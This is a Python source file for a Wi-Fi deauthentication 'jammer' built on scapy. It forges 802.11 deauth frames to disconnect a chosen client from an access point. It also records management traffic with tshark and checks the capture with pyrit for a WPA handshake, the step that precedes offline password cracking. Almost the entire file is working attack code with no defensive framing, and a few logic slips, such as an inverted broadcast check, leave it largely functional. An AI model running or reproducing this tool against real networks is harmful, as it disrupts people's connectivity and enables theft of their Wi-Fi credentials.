#! /usr/bin/env python

# We might just use this?
# https://gist.githubusercontent.com/raw/4576966/4591a64fcad42fe8aff239e3319e5949fef95d59/sniff-aps-complete.py

import threading
import atexit
import argparse
import types
import os
import subprocess
import signal
import sys
import time

import scapy.all as scapy
from analyzr_core import AnalyzrCore


class DeauthJammer(object):

    def __init__(self, ap_bssid, iface="wlan0mon"):
        self._ap_bssid = ap_bssid
        self._thread_event = threading.Event()
        self._thread_event.set()
        self._thread_lock = threading.Lock()

        # scapy.conf.iface =
        atexit.register(self._on_end)
        scapy.conf.iface = iface
        scapy.conf.verb = 0  # Non-verbose mode

    def jam(self, targets, packet_count=1, capture_handshake=False, channel=1):
        self._threads_finished = 0
        self._threads = list()

        if type(targets) is types.StringType or type(targets) is types.UnicodeType:
            old_targets = targets
            targets = list()
            targets.append(old_targets)

        assert type(targets) is types.ListType

        print "scapy.conf.iface set to "  + scapy.conf.iface

        AnalyzrCore.set_channel(scapy.conf.iface, channel)

        proc = None
        capture_filename = "capture_" + str(time.time()) + ".pcap"
        if capture_handshake:
            FNULL = open(os.devnull, 'w')
            proc = subprocess.Popen(["tshark", "-i", scapy.conf.iface, "-w", capture_filename, "-f", "type mgt"], stdin=None,
                                    stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients

        for target in targets:
            jamThread = threading.Thread(
                target=self._deauth_target, args=(target, packet_count), kwargs={})
            self._threads.append(jamThread)
            jamThread.start()

        print "Number of operating threads : " + str(threading.activeCount())
        try:
            while self._threads_finished < len(targets):
                for thread in self._threads:
                    thread.join(.1)

            if capture_handshake:
                proc.terminate()
                proc.wait()

                # validate the capture with pyrit
                pyrit_output = ""
                handshake_captured = True
                try:
                    pyrit_output = subprocess.check_output(
                        ["pyrit", "-r", capture_filename, "analyze"])
                except subprocess.CalledProcessError:
                    handshake_captured = False

                return {
                    "filename": capture_filename,
                    "handshake_captured": handshake_captured,
                    "pyrit_output": pyrit_output
                }

        except KeyboardInterrupt:
            self._on_end()

    def _deauth_target(self, target, packet_count):
        broadcast = target.lower() != 'FF:FF:FF:FF:FF:FF'
        ap_to_client_pckt = scapy.Dot11(addr1=target, addr2=self._ap_bssid,
                                        addr3=self._ap_bssid) / scapy.Dot11Deauth()
        client_to_ap_pckt = None
        if not broadcast:
            client_to_ap_pckt = scapy.Dot11(
                addr1=self._ap_bssid, addr2=target, addr3=self._ap_bssid) / scapy.Dot11Deauth()

        actually_sent = 0
        for n in range(packet_count) or packet_count == -1:
            if not self._thread_event.isSet():
                break

            scapy.send(ap_to_client_pckt)

            # Seems not to be neccessary
            if not broadcast:
                scapy.send(client_to_ap_pckt)

            actually_sent = n

        print "Sent " + str(actually_sent + 1) + " packets to " + target

        with self._thread_lock:
            self._threads_finished += 1

    def _on_end(self):
        self._thread_event.clear()
        for thread in self._threads:
            thread.join()

if __name__ == '__main__':
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-a, --bssid", dest="bssid", required=True,
                            help="BSSID of ap that inadvertently closes the connection", metavar="BSSID")
    arg_parser.add_argument("-t, --client_mac", dest="client_mac", required=True,
                            help="Target of deauthentification", metavar="CLIENT_MAC")
    arg_parser.add_argument("-c, --channel", dest="channel", required=True,
                            help="Channel on which the network operates", metavar="CHANNEL")
    arg_parser.add_argument("-n", dest="count", default="64",
                            help="Amount of deauth-packages to be sent", metavar="COUNT")
    arg_parser.add_argument("-i, --iface", dest="iface", default="wlan0mon",
                            help="Interface to use for sending deauth-packages", metavar="IFACE")

    parsed_options = arg_parser.parse_args()
    parsed_options.count = int(parsed_options.count)
    parsed_options.channel = int(parsed_options.channel)

    jammer = DeauthJammer(parsed_options.bssid, iface=parsed_options.iface)
    print jammer.jam(parsed_options.client_mac, packet_count=parsed_options.count,
                     channel=parsed_options.channel, capture_handshake=True)